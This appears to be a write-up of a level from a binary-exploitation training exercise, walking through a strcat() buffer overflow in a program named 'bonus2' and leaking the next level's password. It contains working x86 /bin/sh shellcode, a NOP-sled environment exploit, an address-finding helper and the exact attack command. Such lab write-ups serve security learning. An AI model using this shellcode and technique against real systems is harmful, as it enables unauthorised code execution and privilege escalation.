# Bonus2

> For introductory information on this operating system and binary securities, check [here](./Ressources/README.md).

Let's see what does the binary do.

```shell
  $> ./bonus2
  $> ./bonus2 "teststring" "teststring"
  Hello teststring
```

> Seems like this program do not respond to any inputs.

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./Ressources/gdb.md)). This time we need to exploit `strcat()` once again to trigger a Shellcode. This program is using a `LANG` environment variable to greet us in the corresponding language if we input two arguments. `fi` and `nl` are recognized along with english being the default one. We must use either `fi` or `nl` to overflow as the greeting message in english is too short. Using `nl` we find out that offset is equal to **23** bytes.

All we have to do is set `LANG` to `nl` and exporting a Shellcode into our environment...

```shell
  $> export LANG="nl"
  $> export SHELLCODE=`python -c 'print("\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
```

... then find its address using a simple program...

```C
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
  printf("env address at %p\n", getenv(argv[1]));
  return (0);
}
```

... and finally plug it into the second argument with the right!

```shell
  $> ./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 23 + '\xXX\xXX\xXX\xXX'[::-1]")
Goedemiddag! �������������������������������������������������������������������
  $ cat /home/user/bonus3/.pass
  71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

So next user credentials pair is `bonus3:71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`.

Check [here](./source.c) for reproduction source-code of this binary.